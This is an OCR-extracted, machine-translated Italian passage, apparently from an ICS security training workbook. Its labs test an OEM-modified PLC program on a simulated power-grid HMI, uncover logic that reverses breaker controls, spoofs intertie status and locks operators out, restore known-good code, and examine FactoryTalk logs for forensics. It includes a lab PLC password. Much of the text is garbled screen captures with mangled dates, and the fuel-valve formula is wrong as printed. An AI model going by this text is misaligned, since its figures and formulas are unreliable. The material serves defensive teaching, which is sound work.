@ CT In funzione @ AVR Acceso Alimentazione Alimentazione Alimentazione |
Modalità esperto — © CT Arrestato © Modalità manuale attiva Generazione consumi disponibile |
Sull'uso dei PB “Avvia | _Votazione pd Industrial 59 | MW Locale 158 MW Locale 280 mw |
= Regolazione automatica degli stati 0
Off = Avvio automatico: sue Setpoint Residenziale 99) «MW intertie 4 MW Intertie 500 Mw
Su Ml | 280| Mw Totale uw Totale [162 | mw Totale [780] MW

Orario sveglia Orario conferma Messaggio

7/9/2021 10:50:13 Allarme Critico Zona Residenziale Pla

08/07/2021 22:41:23 Allarme critico area di transnussione

72021 3:55:42 Pi Fug! Allarme critico valvola 1 J

09/07/2021 15:40.27 Allarme critico Generabon Ares

792021 15:49:27 Generatore locale Nott Min per interruttore chiuso

7192021 3:44:38 Allarme critico area di trasmissione Pld:

7102021 210 48 PU Generazione Ares CeficalAiarm

> Aprire e chiudere l'interruttore del sezionatore per verificare che la modifica del programma PLC supporti correttamente

funzionamento dell'interruttore.

> Impostare il setpoint della modalità manuale della valvola del carburante CT al 100% e posizionare il controllo della modalità della valvola del carburante

alla modalità manuale. Verificare la valvola del carburante % Aprire le rampe al 100%

© 2021, Robert M. Lee

Laboratorio 3.4-11
HMI del sistema BB Powers - Generazione (limite di 2 ore]

Trasmissione

& Distribuzione _ Residenziale

Generazione

Controlli della valvola del carburante CT

@ Modalità manuale

1
© Modalità automatica mater ae}

Aprire

Industriale

Generazione

Allarmi

@ Locale Fare clic su PLE
©GpenPLe

Modalità

Rif

epoche

O

Controllo

aria in ingresso

Tempo Alsim. "Riconosci il messaggio di tempo."

7/9/2021 10:50,13 Pia Rea Residenziale Allarme Critico

71812021 22:44:23 "Braccio critico dell'area di trasmissione".

7192021 3:55.42 Allarme critico valvola carburante pozzo

77912024 3:49.27 Area generazione PHA Braccio critico

79912024 3:49:27 Pld Locel Generator Nott lin Far Breaker Slosed
7792021 15.4438 PM ‘Trasmissione rea allarme critico

79012021 210,48 PL Area Generazione Braccio critico

Tendenze

Turbina a vapore

71912024
alle 23:31:24

Stato dell'interblocco

@intentie On.

Permessi dell'interruttore
@ Generatore in funzione

@Trad. Interruttore chiuso
@Trens. Relè di protezione
@ Carica presente

Turbina a combustione g a
158| Mw.
@CTRunning @AVROn Potenza Potenza Potenza
Modalità esperto OCT arrestato ©) Disponibile accoppiamento manuale sulla generazione dei consumi

on=useras fl San) _vottage Manuale Industriale 5a | MW Locale 168] MW Locale [280 | mw

Spento = Avvio automatico = Modalità di regolazione L ne
, Setpoint Residenziale 99 MW intertie ) Mw 500 Mw
_ 200) MW Totale uw Totale [168] ww =Totale [ 7e0 | MW

> Riportare il controllo della modalità della valvola del carburante CT sulla modalità automatica e verificare la percentuale della valvola del carburante

si sposta su un valore inferiore al 100%
>

“~

*Nota* Quando la valvola del carburante è posizionata in modalità automatica, la percentuale di apertura della valvola del carburante viene calcolata per soddisfare il carico
i cambiamenti. Quando la valvola del carburante è in modalità manuale, la percentuale di apertura della valvola del carburante è impostata sul setpoint della modalità manuale.
Si noti inoltre che se la percentuale di apertura manuale della valvola del carburante è troppo bassa per supportare il carico, l'uscita MW del generatore CT lo sarà
limitato dalla % di apertura della valvola del carburante.

> L'OEM ha modificato il funzionamento della valvola del carburante rispetto a una relazione lineare come mostrato nel grafico
a sinistra a una relazione lineare più aggressiva come mostrato nel grafico a destra. Vogliamo

@

per testare il nuovo calcolo della valvola del carburante per garantire che il codice della valvola del carburante funzioni correttamente.

100 100
% Carburante % Carburante
Valvola Valvola
Apri Apri
00

0MW

280

0

MW

280

> Per effettuare un controllo rapido, utilizzeremo la seguente formula per convalidare la sostituzione della valvola del carburante.
(MW di potenza + MW massimo del generatore) x 110 = % di potenza della valvola del carburante

© 2021, Robert M. Lee

Laboratorio 3.4-12

oe@@oe fe

diavolo

(B)
wwe wo» Wb wb dbo WY wv wb

Vv Ww WwW FT Ww WwW Ww W

uo w Ww

*Nota* Nel nostro esempio abbiamo (154 MW di potenza + 280 MW di potenza massima del generatore) x 110 = 60% valvola del carburante
Produzione

> Utilizzando la schermata Generazione, verificare che i calcoli della percentuale di uscita della valvola del carburante siano corretti e che
L'OEM ha effettivamente apportato le modifiche corrette al codice.

> Abbiamo caricato un programma PLC senza arrestare il motore di esecuzione del codice PLC

> Abbiamo impostato la nostra Grid Board per avere l'interruttore di trasmissione chiuso e la trasmissione
Reset del relè di protezione

> Abbiamo aggiunto carichi residenziali e industriali

> Abbiamo controllato e verificato il funzionamento delle risorse di generazione locale tramite l'HMI
il controllo della valvola del carburante si adatta automaticamente alle variazioni della domanda di generazione in risposta al carico
i cambiamenti

© 2021, Robert M. Lee Lab 3.4 -13
vo vw YY Sì wu www w

_Laboratorio 3.5 — Verifica del punto sul campo _

e __ Verificare tramite gli strumenti di monitoraggio della rete se il PLC è stato scaricato
e Testare la nuova funzionalità logica del PLC
e Trovare indizi per determinare cosa c’è di diverso

*Informazioni sullo scenario* Dopo le modifiche logiche apportate alle informazioni OEM di cui abbiamo bisogno
esaminare e convalidare la logica e garantire che non si verifichino attività anomale nel nostro ambiente.

Questa è una continuazione del Lab 3.4 e utilizzerà il kit VM e PLC Windows

1. Come facciamo a sapere se l'interruttore Switchyard è chiuso? Ci fidiamo dei LED o dello stato dell’HMI?

2. È possibile controllare l'HMI da remoto?

3. È possibile che il codice PLC modifichi le schermate HMI?

© 2021, Robert M. Lee Lab 3.5-1
Collaborando con il personale tecnico sul campo, si azionano i pulsanti fisici e si osservano gli indicatori LED
per verificare il corretto funzionamento sul campo.

1.

2.

Prova l'interruttore del commutatore Chiudi PB

> Premere Switchyard Breaker Close PB (questo test dovrebbe verificare che l'operazione di chiusura mantenga il

interruttore nello stato chiuso e non dovrebbe influenzare in alcun modo la generazione)

Be Power Sect Hiat- Generazione {2 Hout Lim)

Trasmissione

& Distribuzione | Residente

Controlli della valvola del carburante CT

@ Locale Chex PLE

toa % Apri O Apre
‘
Controlla "Canto!" Punto di riferimento

Vela di guerra| [00] «aperto

© Ode Mana
i 2 © Artoratic Hoe Leow

Industriale

Generazione

79/2024

ogni 41:50:11 PM

Stato dell'interblocco

@irtere09
Permessi dell'interruttore:

@ Carico presente

“Turbina a vapore

: / Produzione
“Turbina di combustione @ aw |
@crRining Ave oe Potenza Potenza Potenza
Expert Made ©) CT arrestato O) Modalità manuale sulla generazione dei consumi disponibile
"Sim 8."
on=Utenti | Sak | Ba weal indusinat [80] MW toc [+] MW Loca [0
Of = fate Sart: ey —_Selpownt Residentiad [€0] MW nierie [158] MW Inerio
ae potere | | ww Totale mw Totale [168 | uy Totale
Tnomicyeire —_Tasnase
JAgnas fose-s3pa cra sa
imate} e129 Pu “rananareen tee Cris
stuoie} 25640 Ht Ecorse ea sam
Yaanes 34827 Fl 'Saneaon na Cra lar
Yaya 32037 Pu CSS Steerat ita an: Gear ieree
'zie 34838 Teanamesin mare
più raro sperma ea Sa

> Osserva cosa è successo

Prova l'interruttore del commutatore aperto PB
> Spingi l'interruttore del commutatore per aprire il PB

[Sistema di alimentazione bt - Generazione 2 Hew Lene]

sione

memoria! | Residenziale

| Controlli della valvola del carburante CT
| © Manuale Mee 1
TS cx] =
| © Local Chek PLC F

[460] Pene aperto

Locale ar Marval

Cpenpic ote, ge

Setpoint di controllo del controllo

Aria Intera

| ES

120 |°F
J --
K
Turbina a combustione
@crasning DAM attivo
Modalità esperto == ©) CT interrotto © Manuale eseguito
sant BM ctoge = Marat
Bi 2. ==) Modalità di regolazione
: Seloort
Sop Marah 70] mw]

Stato dell'interblocco

@ inverso attivato

'Permissivi dell'interruttore

©Generatore Ruoneg

@ Trans Breaker Crsee

@ Trans, Relè Protectan
@ Carica presente

“Turbina a vapore

183 ganascia
Potenza Potenza Potenza
Generazione del consumo disponibile
industiat [58] MW locale [160] MW locale [280] uw
Residenziale [09 | MW contatore [0 | MW batteria [S09 | Mw
Totale www Totale [188] ww Totale (709)

5
R202) 2 40 Pu

> Osserva cosa è successo

© 2021, Robert M. Lee

Laboratorio 3.5-2

(®) (es) (®) (*) (®) (2)

aay

>®®®

®)
ww wo WO WO WO ODDO DDO OD Dw

oe ww ww Ww WwW

ip'

> Sembra che il pulsante di apertura dello Switchyard Breaker chiuda lo Switchyard Breaker
> Sembra che il pulsante di chiusura di Switchyard Breaker apra Switchyard Breaker
> Sembra che i LED di chiusura e apertura dell'interruttore del quadro elettrico corrispondano allo stato dell'HMI

Compito: testare le interdipendenze

La convalida del funzionamento dell'interruttore del quadro ha causato lo spegnimento dell'unità di generazione a causa di un errore
le operazioni di controllo manuale sul campo vengono invertite. Il carico residenziale e industriale è rimasto intatto a causa del
collegamento interno al sistema elettrico più ampio. Il collegamento all'Intertie è molto critico per il locale
operazioni di generazione e finché l'interconnessione è attiva e connessa, le risorse di generazione locale non lo sono
preoccupato se il carico delle aree Residenziali o di Distribuzione Industriale dovesse azzerarsi a causa del locale
le risorse di generazione possono fornire energia attraverso l'Intertie. Se l'Intertie è disattivato, dobbiamo monitorarlo
le aree Residenziale o di Distribuzione Industriale vanno a zero in modo da poter far scattare l'interruttore del Switchyard e restare inattivi
il generatore locale. Dovremmo testare per vedere se lo stato Intertie funziona correttamente.

1. Testare lo stato della connettività Intertie
> Passare alla schermata Generazione, accendere la turbina di combustione e chiudere la
Interruttore del commutatore
> Disattiva l'interruttore Sim 3 - Intertie
> Passare alla schermata Trasmissione e distribuzione
> Fare clic sull'area "Generazione Intertie" per disattivare la connessione Intertie.

40/07/2021

Tendenze industriali della generazione residenziale 421742 AM

Trasmissione e distribuzione

Brier
Lamda
Sottostazione Lamda
Casa del potere
TRASFERIMENTO AUTOBUS

Lamda
Lambda Open ‘cose | Trasmissione
«Interruttore sinistro della trasmissione
Protezione e
Rey a) Colpa | [questo;
4B a ne

. =.&BP
wb = - + s ve | @ |

Consumo di MW
a) MW

Orario sveglia Orario conferma: messaggio
71912021 10:50:13 Pld Residenval 4vea Allarme Critico
77912021 10:41:23 Pa Trasmissione Ares Critical Airarm
7192021 3:59:42 Allarme critico valvola carburante Pla:
71912021 3:49:27 Allarme critico area generazione Pl
09/07/2021 3.49.27 Generatore locale PH non a pinna per Greaker chiuso:
09/07/2021 15:44:38 PA "Allarme critico area di trasmissione".
79912021 14:10:48 Allarme critico area di generazione
© 2021, Robert M. Lee Lab 3.5-3
Generazione residenziale industriale

Generazione
280 MW

Sottostazione

|
|
SL Tunisi |
|

TRASFERIMENTO AUTOBUS

Trasmissione e distribuzione =) -- —————

Lamda

J Breaker

Lambda aperto
Trasmissione
Protezione
Relè @) Guasto
. Nuovo

Richiusura

7/10/2024
00:20:53

Consumo di MW
191%

=

Orario sveglia Orario conferma Messaggio
792021 105013 Area residenziale animali Criteat arm

7912021 10:41:23 Pld 'Allarme area critica di trasmissione

7797202135642 PLL Allarme critico valvola carburante

71902021 2:49:27 18 Generazione érea Catical

7912021 15:49:27 Generatore locale Nott iin per interruttore chiuso

77072021 15:44:38 ‘Allarme caico area di trasmissione

71992021 2:10:48 Allarme Generazione PA Area Caticai

> L'HMI corrisponde al LED fisico Intertie?
> Attiva l'interruttore Sim 3: Intertie
io. Lo stato dell'HMI cambia?
ii. Lo stato fisico del LED Intertie cambia?

> Sembra che lo stato dell'interfaccia HMI e il LED fisico dell'interconnessione non corrispondano allo stato

> Sembra che l'impostazione dell'interruttore Sim Switch 3 - Intertie su On non influisca sullo stato Intertie
> Sembra che il codice PLC OEM sia stato alterato in modo potenzialmente dannoso per provocare un'inversione

funzionamento dei pulsanti fisici di Switchyard

> Sembra che il codice PLC OEM sia stato modificato in modo dannoso per falsificare lo stato del

Intertie che potrebbe portare a un cattivo funzionamento delle risorse di generazione locale quando l'Intertie lo è

non disponibile.

© 2021, Robert M. Lee

Laboratorio 3.5-4

@

=
sì vw +

/- guai a

Compito: test continuo del sistema

Il nostro sistema è stato programmato per considerazioni estive e invernali. Possiamo usare Sim Switch 2 per
simulare queste modalità in cui l'accensione di Sim Switch 2 ci consentirà di mettere il sistema in modalità invernale. Come noi
iniziare a caricare il sistema, possiamo vedere l'effetto della modalità invernale.

> Attiva la modalità invernale
> Attiva l'interruttore Sim 2: modalità invernale

> Attiva l'interruttore Simulazione intertie
> Attiva l'interruttore Sim 3: modalità Intertie

> Carica la zona industriale attivando le raffinerie
> Passa alla schermata Industriale e attiva le raffinerie A e B

Principale

'Trasmissione

Generazione e distribuzione TEESE residenziale.

7130/2021

19:46:24. USCITA

Accesso ai trend degli allarmi

\
o/

Consumo di MW

Pesca MW 299

Uscita in corrente 99

Per T T

Raffineria B
SU

Spento

> Passare alla schermata di generazione

>
>
>
>
>

© 2021, Robert M. Lee

Verificare che i controlli del carburante CT siano in modalità Local Click PLC

Verificare che il CT sia in esecuzione e che la modalità AVR sia attiva

Si noti che il consumo energetico dei MW industriali è superiore a 200 MW
Si noti che il consumo energetico dei MW residenziali è superiore a 80 MW
Si noti che la produzione di energia del MW locale è maggiore di 200 MW

Whamo – Cosa è successo! La schermata HMI è passata alla schermata principale e ora sei tu
bloccato dal cambio di schermata! Inoltre, hai notato che c'è lo Switchyard Breaker locale?
visualizzando uno stato aperto nell'HMI!

Laboratorio 3.5-5
HMI BB Power System - Principale (limite di 2 ore}

Generazione

_Generazione

Residenziale Industriale

Tendenze

Intercettazione

Login

'Trasmissione

7/10/2024

1:08:28 EST

Configurazione prurito
Relè di protezione dell'interruttore di uscita MW =
n Chiudi Apri Chiudi | Ripristino errori |
N 4 ~ f XN “4 |
|
\7» |
|
Generatore \ oye |
|
\ ~oY/\o-—
Io ooh
bai a == oc noo - SSS SS SS SSS SSS SSS SS tbe
=| Carica T
T min <> T max
0 T l T
| 'SU
mamma AN Richiusura
109' e) Apri Chiudi
io’ | “os
io AY 7] cordone
7\. Misuratore di potenza (%) | na {min <> max
7 \)———
!
1 \em| =o pi |
VAN [ee T
© 2021 SANS'Era}! j———-5
Prodotto negli USA, 1 Pe LL 100)
industria l t Distribuzione
'Alam ime ~Acmnowiedsetime 'Messaggio
7972021 10:50:13 \area Allarme critico
7ai2021 10:41.23 Allarme critico nell'area di trasmissione Pla
Tyw2021 355 42 Pe Carburante vahe Citical asm
7172021 15:40:27 Allarme critico area Ganerabon
71912021 2:49:27 Pl Locai Generator non al minimo per interruttore chiuso
7192021 34438 Ph ‘Allarme critico area di trasmissione
7102021 2:10:48 Allarme acustico area generazione Pd

> Ora siamo bloccati fuori dall'HMI: non possiamo cambiare schermata e utilizzare il nostro sistema
> Non abbiamo scaricato il nuovo codice HMI
> Non siamo sicuri che il codice PLC OEM abbia qualcosa a che fare con il blocco del nostro HMI

© 2021, Robert M. Lee

Laboratorio 3.5-6

@) ehi,

ee)

@
va ww ww

iw

Attività: ripristinare il codice PLC "

La risposta tradizionale al codice PLC e/o HMI compromesso è ripristinare o ripristinare il codice PLC precedente
ad una copia “Golden”. Proviamolo e vediamo come va ©.

> Caricare il file della logica operativa nel PLC

aw

en

iw

UN

> Individuare il file nella cartella ics515: "ICS515 Site Acceptance Test V1.ckp"
io. Questa è la logica valida e nota che era in uso prima della modifica dell'OEM.> Fare doppio clic sul file per avviare il software di programmazione CLICK con il progetto

Software di programmazione CLICK (Versione 3.01) - Test di accettazione del sito ICS515 V1.ckp - [Programma principale]

PAstea re Zz D destini
| © Progetto Wyte di riferimento incrociato
Collegare 13 informazioni PLC

Programma Funzione PLC

| Ry DistindAlarms
I MIEI DistintiStetes
$y Distindustriale
fil DistResAiarms
| iigy DistResidentiat
(Rigg DistResStates
Controllo del carburante della generazione pubblicitaria

> Quando si apre l'applicazione, trova nel menu in alto l'icona con la freccia rossa verso il basso che ti serve
Scrivere un progetto in un PLC

> Apparirà una schermata di connessione, potrebbe essere necessario selezionare Ethernet nel menu a discesa Tipo di porta e
dovresti vedere un PLC che è stato scoperto.

'Connettiti a CLICK PLC x
‘Switch/Hub a
«Questo computer + as
: fe—
ae ees
Ethemet o Ethernet
Connessione diretta
a S) Posizione del PLC CCK di destinazione

@©n alcune LAN (scansiona automaticamente tutti i PLC CLICK nella LAN.)

Scheda di rete:
) J) All'esterno di questa LAN (è necessario assegnare manualmente l'indirizzo IP e il numero di porta.)
Impostazione del porto Chen
Indirizzo BP: 192.168.0.8

Maschera di sottorete; 255.255.258,0
Gateway predefinito: 0.0.0.0

Aggiorna Bink RUN AERR LED Edt...

© 2021, Robert M. Lee Lab 3.5-7
> Fare clic sul pulsante Connetti

> Inserisci la password “sansics123”.

sostituire l'intero programma senza eseguire il motore di esecuzione del codice.

Scrivi il progetto nel PLC
LG |
|
Nome del progetto: [ICSS15V10 per schede di produzione —_| |
| Dimensioni del pragramma (totale: 6.000 passaggi) |

| Dimensioni W@iProgram: 1.215 passaggi ({ 15,18 %) | |
| | Area GiiFree: 6.785 passi (84,82%) |

0

File di progetto (totale: 262, 144 byte)
Dimensione file EiProject 40.590 byte (15,48%) |
Area BiFree: 221.554 byte (84,52%) |

|
Deeg ama oe
0 262.144 | |
|

Ultimo aggiornamento: 09 luglio 2021, 22:54:06

| M scrive il file di progetto nel PLC
| Abilitando questa opzione, il file di progetto sarà
scaricato{Scrivi) nel PLC. Se vuoi disabilitare
caricamento del progetto (lettura), disabilita questa opzione.

5

ICSS15V 10 Modifica OEM per produttore|

“Dimensione del programma (totale: 8.000 passaggi)

Dimensioni del programma Wi:
Area GiFree:

jo

1.239 passi (15,48%)
6.761 passi (84,52%)

File di progetto (totale: 262, 144 byte)

BDimensioni del file di progetto
Area GiFree:

41.174 byte (15,70%)
220.970 byte (84,30%)

Ultimo aggiornamento:

Modifica tempo di esecuzione
Abilitando questa opzione, il programma verrà scaricato in

262.144

09 luglio 2021, 23:12:53

il PLC senza commutare la modalità PLC su STOP

modalità,

> - Confermare che si desidera portare il PLC in modalità STOP

Nome del progetto: [[CS515V10 per schede di produzione |

1.215 passi (15,18%)
6.785 passi (84,82%)

Fare clic sul software di programmazione

Il PLC è in modalità RUN.

Vuoi passare alla modalità STOP?

09 luglio 2021, 22:54:06

M1 Scrive il file di progetto nel PLC

Abilitando questa opzione, il file di progetto sarà
ite) nel PLC. Se vuoi disabilitare
caricamento del progetto (lettura), disabilita questa opzione.

© 2021, Robert M. Lee

f PLE
Tipo CPU: c2-01cPU
Nome del progetto: {ICS515V10 Modifica OEM per il produttore
"Dimensione del programma (totale: 8.000 passaggi)

| Dimensioni del programma:
Area GiFree:

Ultimo aggiornamento:

144 byte)

1.239 passi (15,48%)
6.761 passi (84,52%)

8.000|

41.174 byte (15,70%) |

220.970 byte (84,30%) |

Modifica tempo di esecuzione

262.144

Abilitando questa opzione, il programma verrà scaricato in
il PLC senza commutare la modalità PLC su STOP

modalità.

UN)

Aiuto

09 luglio 2021, 23:12:53 |

Quando richiesto, deselezionare "Run Time Edit" in modo che il programma PLC interrompa l'esecuzione del programma e

Laboratorio 3.5-8

oh oh e

, ® fH ow

)

, B®

® Domne ® ® @

?,
Selezionare OK per riportare il PLC in modalità Run

> Verificare che il nuovo codice PLC OEM sia stato scaricato
> Verificare che l'intestazione della finestra indichi "ICS515 Site Acceptance Test V1.ckp"

~Il mio DistResStates

G4 Gen_Fuel_Control
Si Genlarm:

$i generazione

4 GenStati

(Gf ivinalizza

nageyoea peepee:
ph Samia ie bse

~ ig] RemoteCommWt “Transilarms
Trasmissione Aj TransAlarms
| Hy Trasmissione | TransStati:
| fy TransStates
interrompere il programma
| @Selettore indirizzo | Scrivi progetto nel PLC...
di Modifica commenti rung ¥ Trasferimento completato.
|

| 1C9515 Test di accettazione in sito V1 - 0 errori, O avvisi

<

Bist intero Bintegert2 parole) [Bl Floating pom Me (itet (AjAcch RUN

> Verifica se puoi cambiare schermata

> Torna al client HMI FTView e vedi se riesci a cambiare schermata

© 2021, Robert M. Lee

2-1 CPU

1A

Laboratorio 3.5-9
Ty Power System HMl= Principale [2 ore Lint]

Generazione

'Trasmissione

7 intere
Cambia '5
Potenza MW et | . Relè di protezione dell'interruttore
Apri Clo: 'Apri Chiudi
“f pe a fuggire H Aperto, un Guasto, «Reset
1| ‘
' Rif
PN f_® | | | » “ NIA ZN
tr
Generatore 1a
= ——
Oo o- onfo-
foc aor re rte nemo SSSt 4 ---- -- - SSS
= Carico T
T min <> T max
30 LJ T T
mal] Io | gy rosso
mood iA _ ‘eclusione
ks hed! un'apertura e chiusura
7 1 “ON
>7| Carico
(Se 1 \ Misuratore di potenza (6) | Occhio Min Max
Wy50 >
a WA N 7 } T
© 2021 SANS | ! Goo 4 fia 5 6
Prodotto negli Stati Uniti. 0! Epoca yON: 100
Industria | Distribuzione

"Riconosci il tempo."

«Ora delle Allah.»

71972021 10.50.13 TEL
'79/2021 10:41:25 PH
77972021 3:55:42 Pd
7/a72021 2:49.27 PA
71972021 349.27 Pu
71a'2021 3:44:38 PA

> Abbiamo scaricato il codice PLC precedentemente eseguito e non possiamo ancora modificare l'HMI

schermi

VVVWV

Messaggio

‘Allarme critico trasmissione 4res

Valvola carburante Arr. critica

Allarme critico per l'area di generazione

Generatore locale Nott Min per interruttore chiuso
Area di trasmissione Lar. critica

Il codice HMI non è stato modificato né è stato scaricato
Tentare di spegnere e riaccendere il PLC

Tentare di chiudere l'HMI e riavviarlo
Sfrutta i controlli manuali per chiudere gli interruttori di campo e il simulatore passa per cancellare gli allarmi

poiché non è più possibile navigare tra le pagine degli allarmi tramite l'HMI

> Attraverso questi controlli manuali è possibile avviare manualmente la generazione, tuttavia non è più necessario

visualizzazione o controllo dell'operatore.
> È ora di chiamare un team di risposta agli incidenti per eseguire alcune analisi

© 2021, Robert M. Lee

Laboratorio 3.5-10

(*

@) cP

c®)

m@) mio) @) ey @) @®)

)

RP@®@meenenee®

@)
ww Ww wa ww

ww

© Comprendere quali capacità di registrazione e forensi possono esistere sui dispositivi di controllo

*Informazioni sullo scenario* Dopo l'incidente, durante le attività di raccolta dati e analisi forense, ce ne sono molti
Dispositivi del sistema di controllo industriale che non dispongono di una forte registrazione relativa alla sicurezza informatica o di analisi forensi
capacità. Tuttavia, esistono spesso approcci efficaci per sfruttare l'analisi forense della rete e degli endpoint, ad esempio
nonché elaborare l'analisi degli eventi, i dati storici e i dati degli allarmi per comprendere i vari eventi operativi che
si è verificato. Sfruttare gli strumenti forniti dal fornitore per l'analisi dei file di registro, l'analisi delle tendenze e l'esame dell'applicazione ICS
registri specifici possono fornire ai difensori del sistema informazioni importanti sul normale comportamento del sistema e
eventi anomali.

Preparazione agli esercizi

Chiudere tutti gli interruttori del sistema, assicurarsi che il generatore sia in funzione e che l'interconnessione del sistema sia chiusa. Chiudi il
schermata HMI dell'operatore.

1. Qual è il nome del file di registro locale di FactoryTalk?

Compito: tendenze dei processi e set di dati storici per la medicina legale

*Nota* Il tuo sistema è attualmente bloccato a causa dell'attacco informatico. Non puoi completare questa attività fino a dopo l'Es
4.2 dove si fissa il kit. Questo compito rimane qui perché logicamente appartiene qui al materiale del corso
ma dovrai rivisitare questo compito specifico dopo il prossimo esercizio. Puoi continuare con l'attività successiva.

1. Esaminare le tendenze dell'HMI.

> Avviare l'HMI ma questa volta selezionare "Sì" per "Eliminare i file di registro prima dell'esecuzione" di seguito
finestra prima di selezionare "Esegui applicazione".

Elimina file di registro | ©Y

Prima di correre

S
C no

> Assicurarsi che tutti gli interruttori siano chiusi, che la generazione sia in corso e che l'interconnessione sia chiusa.

© 2021, Robert M. Lee Lab 4.1-1
> Dall'HMI, aprire il menu "Trend" e scorrere ciascun trend nel menu. Prendere

notare se alcune tracce mostrano valori storici e attuali mentre altre lo sono
non simile all'immagine qui sotto.

Tendenze

Generazione
eee eee
Trasmissione &
Distribuzione

=<)

‘

|

*Nota* A volte esistono anomalie negli ambienti reali che devono essere comprese quando si utilizzano questi
applicazioni per scopi forensi. In questo sistema che utilizza il noto software del fornitore ICS, c'è una gara
condizione tra l'avvio del server di registrazione dati e la risposta alla richiesta iniziale dell'OPC
server. Il risultato è che alcuni valori vengono registrati continuamente mentre altri non vengono mai registrati. Bug
come questi possono diventare più rilevanti con un maggiore mix di fornitori, versioni di applicazioni e sistemi
risposta (ovvero programmazione del PLC e funzionamento della rete). L'immagine sotto mostra questa anomalia. IL
i valori per "CT Running" non vengono registrati anche se sono configurati per la registrazione. Questo è identificabile
a causa della lacuna nei dati prima dell'apertura del display.

2.

*Nota* I valori di trend vengono interrogati e memorizzati in tempi periodici impostati dallo sviluppatore del display. Ogni volta

un interruttore del generatore Bl

oe Interruttore di trasmissione bi
<a} [Relè di protezione MM

CT in esecuzione

|
| BBAvron

Comprendere come viene utilizzato lo storico.

Dall'HMI, apri il menu "Trend" e seleziona "Trasmissione e distribuzione".

Vengono registrati molti punti dati. A scopo di test, aprire tutti gli interruttori sul
ambiente.

Ritorna alla schermata "Trasmissione e distribuzione" e nota la modifica dei valori dei dati
punti.

viene aperta una visualizzazione della tendenza, i punti dati e i valori associati vengono richiamati dalla posizione memorizzata. Come
i valori memorizzati variano a seconda dell'applicazione utilizzata.

UN

guarire

fe

>

>

3. Comprendere come vengono archiviati i set di dati di tendenza.
> Dalla VM Windows aprire Explorer e accedere alla seguente cartella.
© 2021, Robert M. Lee Lab 4.1-2
ey PF wD Ww WD WP PW eS noi noi ww

noi noi Ww

"C:\Logs\DataLog"

Apri il file DataLog.log nel Blocco note.

Chiaramente il file non è memorizzato in testo normale. Questo file può essere visualizzato utilizzando lo strumento fornito
dal fornitore, aprire l'applicazione "FactoryTalk View File Viewer".

Passare a "C:\Logs\DataLog" e modificare il tipo di file in "ME Datalog (*.LOG)"

Nome del file:

File di registro dati SE (*.DAT;*.0BF) ~

>

File di registro dati SE (*.DAT;*.OBF)

File di registrazione dati ME (*.TRONCO D'ALBERO)
File di registro allarmi ME(*.ALM)

File dBASE(*.DBF)
File RecipePlus(*.RPP)
File RecipePro(*.RCPF)

Apri il file DataLog.log, scegliendo un fuso orario qualsiasi e rivedi le informazioni.

*Nota* Tutti i record sono presenti e indicano a cosa sono associati. Il tag configurato del
vengono visualizzati i dati da registrare. Una mappatura dei nomi dei tag rispetto ai nomi utilizzati nelle visualizzazioni dei trend (ad es.
CT Running) sarebbe utile ma può essere facilmente trovato dal tecnico dei controlli. Questo set di dati registra il passato
stato del processo che può essere utilizzato come evidenza di condizioni di processo esterne alle operazioni previste.

Attività: elaborare i registri degli allarmi per la scientifica

1. Identificare i registri degli allarmi dell'HMI.

>
>

VVVV WV

Assicurarsi che l'HMI sia in funzione e aprire alcuni interruttori per attivare gli allarmi.
Apri Explorer e vai alla seguente cartella.

C:\Utenti\Pubblica\Documenti\RSView Enterprise\ME\Logs\ICS515V5\M_Alarms

Dovresti vedere alcuni file di allarme qui, integrati, cronologia, ripristino e registri degli allarmi di stato
Aprire l'applicazione "FactoryTalk View File Viewer".

Passare al percorso del file indicato sopra e premere "Invio".

Modificare il tipo di file in "File allarme ME (*.ALM)"

Seleziona la cronologia "history.alm".

© 2021, Robert M. Lee Lab 4.1-3
5D apertox
- vf © ME > Registri > ICS515V4 > M_Alarms v © Cerca M_Alarms Pp
Organizza > —_ Nuova cartella ae- © @

File dello studente Nome Data di modifica Tipo Dimensione
B Video ©) embedded.alm ALM File 1KB
@ OneDrive _) file History.alm ALM da 1 KB
“] reimposta ALM Fite 1KB
© Thi >
ini) statusiaim 2021 3:19 EM KB
8 oggetti 3D
@® Desktop
4) Documenti
e download
} Musica
© Immagini
B Video
J locaiDiskicn Y < 2

v| (File registro allarmi ME(*.ALM) ™

Nome del file: |storia.alm

> Lasciare selezionato il punto elenco "Win32/CE (9.0 o successivo)" e fare clic sul pulsante di selezione del percorso ".... per scegliere

il file di configurazione dell'allarme.

> Poiché la copia di sviluppo del file di progetto non è archiviata, sarà necessario che lo sia la versione runtime
usato. Digitare solo %TEMP% nel campo del percorso e selezionare Invio.

> Aprire la cartella ""MER.OO".

Apri x
@

e Cerca M_Alarms P

Organizza * Nuova cartella =+ © @

2 Musica “Nome Data modifica Tipo Dimensione

File degli studenti 0) MachineAlarms.mal 36/07/2021 15:09 File MAL SKB

@®OneDrive

@ Questo PC

Oggetti 3D J
(@Desktop
=} Documenti
& Downiaads
2 Musica

& Immagini
video gz

= _lacalNiskica Y¢

File di configurazione dell'allarme ME (*.mal) v

Nome del file: IM

*Nota* Questa cartella è presente solo quando viene caricata l'applicazione HMI.

> All'interno della cartella ~MER.00, scorrere verso il basso e aprire la cartella M_Alarm.
> Scegli "MachineAlarms.mal" e fai clic su "Apri".

© 2021, Robert M. Lee Lab 4.1-4

e® f® @® @&

Ce

)

fe)

(®)
VY ip’ a) ip) <p ip

J

> Fare clic su "OK".

Selezionare il file di configurazione degli allarmi FactoryTalk View ME

File di registro degli allarmi di FactoryTalk View ME:
CAUsers\Pubblica\Documenti\RS View Enterprise\ME\Logs\ICS515V4\M_Alarms\histary.alm

Dal file di registro degli allarmi ME (alm) viene generato
© Terminale CE (Mozar/Raptor) Win32 (3209 © Win32 (4x ar 6.1)

© Terminale CE (PVPCE6) © Win32 (6.0 - 8.20) (@ Win32/CE (9.0 o successivo)

File di configurazione degli allarmi FactoryTalk View ME:

C:\Utenti\sansics\AppData\Local\Temp\~*MER.00\M_Alarms\MachineAlarms.mal bd

OK

© 2021, Robert M. Lee

Laboratorio 4.1-5
*Nota* Gli allarmi sono elencati con i timestamp di quando si è verificato l'allarme (TimeOn) e quando si è verificato l'allarme
è stato riconosciuto (TimeAck). Purtroppo sapere cosa sia ciascun allarme non è presente in questa tabella ma lo è
denominato "Trigldx". Serve qualche altra informazione e per fortuna l'ingegnere è stato così gentile da darmela
fornire la seguente tabella di configurazione dal software di sviluppo.

Trigger Messaggio valore trigger
1 {::Clickplc.0:16395} 1 Allarme critico dell'area di generazione
2 {::Clickplc.0:16492} 1 Allarme critico dell'area di trasmissione
